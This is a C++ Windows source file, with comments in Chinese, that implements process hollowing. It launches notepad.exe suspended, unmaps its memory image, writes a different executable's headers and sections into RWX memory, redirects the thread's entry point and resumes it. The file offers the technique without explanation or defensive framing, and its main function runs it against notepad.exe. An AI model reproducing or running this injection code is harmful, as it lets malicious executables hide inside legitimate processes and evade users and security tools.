#include "stdafx.h"
#include <windows.h>

BOOL InjectProcess(LPTSTR VictimFile, LPTSTR InjectExe)
{
	typedef DWORD (__stdcall * ZWUNMAPVIEWOFSECTION)(HANDLE, PVOID);
    HANDLE hFile;
    DWORD dwFileSize;    //文件大小
    IMAGE_DOS_HEADER DosHeader;
    IMAGE_NT_HEADERS NtHeader;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    CONTEXT context;
    PVOID ImageBase;
    unsigned long ImageSize;
    unsigned long BaseAddr;
    unsigned long retByte = 0;
    LONG offset;
    HMODULE hNtDll = GetModuleHandle("ntdll.dll");
    if(!hNtDll)
        return FALSE;

    ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)GetProcAddress(hNtDll, "ZwUnmapViewOfSection");

    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    hFile = ::CreateFile(InjectExe, GENERIC_READ, FILE_SHARE_READ |
                         FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    ::SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    dwFileSize = ::GetFileSize(hFile, NULL);
    LPBYTE pBuf = new BYTE[dwFileSize];
    memset(pBuf, 0, dwFileSize);
    DWORD dwNumberOfBytesRead = 0;
    ::ReadFile( hFile
                , pBuf
                , dwFileSize
                , &dwNumberOfBytesRead
                , NULL
              );

    ::CopyMemory((void *)&DosHeader, pBuf, sizeof(IMAGE_DOS_HEADER));
    ::CopyMemory((void *)&NtHeader, &pBuf[DosHeader.e_lfanew], sizeof(IMAGE_NT_HEADERS));
    //检查PE结构
    //以挂起方式进程
    BOOL res = CreateProcess(NULL, VictimFile, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (res)
    {
        context.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &context)) //如果调用失败
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return FALSE;
        }
        ReadProcessMemory(pi.hProcess, (void *)(context.Ebx + 8), &BaseAddr, sizeof(unsigned long), NULL);
        if (!BaseAddr)
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return FALSE;
        }
        //拆卸傀儡进程内存模块
        if (ZwUnmapViewOfSection(pi.hProcess, (PVOID *)BaseAddr))
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return FALSE;
        }
        ImageBase = VirtualAllocEx(pi.hProcess,
                                   (void *)NtHeader.OptionalHeader.ImageBase,
                                   NtHeader.OptionalHeader.SizeOfImage,
                                   MEM_RESERVE | MEM_COMMIT,
                                   PAGE_EXECUTE_READWRITE);  //ImageBase 0x00400000
        if (ImageBase == NULL)
        {
            DWORD wrongFlag = GetLastError();
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return FALSE;
        }
        //替换傀儡进程内存数据
        if(!WriteProcessMemory(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &retByte))
        {
            DWORD wrongFlag2 = GetLastError();
        }
        //DOS 头 + PE 头 + 区块表的总大小
        //定位到区块头
        offset = DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS);
        IMAGE_SECTION_HEADER secHeader;
        WORD i = 0;
        for (; i < NtHeader.FileHeader.NumberOfSections; i++)
        {
            //定位到各个区块
            ::CopyMemory((void *)&secHeader, &pBuf[offset + i * sizeof(IMAGE_SECTION_HEADER)], sizeof(IMAGE_SECTION_HEADER));
            WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), &pBuf[secHeader.PointerToRawData], secHeader.SizeOfRawData, &retByte);
            VirtualProtectEx(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &BaseAddr);
        }

        context.ContextFlags = CONTEXT_FULL;
        //重置 执行文件入口
        WriteProcessMemory(pi.hProcess, (void *)(context.Ebx + 8),
                           &ImageBase,   //4194304
                           4, &retByte);
        context.Eax = (unsigned long)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(pi.hThread, &context);
        ResumeThread(pi.hThread);
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    ::CloseHandle(hFile);
    delete[] pBuf;
    return TRUE;
}

int main(int argc, char *argv[])
{
    InjectProcess("C:\\WINDOWS\\system32\\notepad.exe", "C:\\test.dll");

    return 0;
}
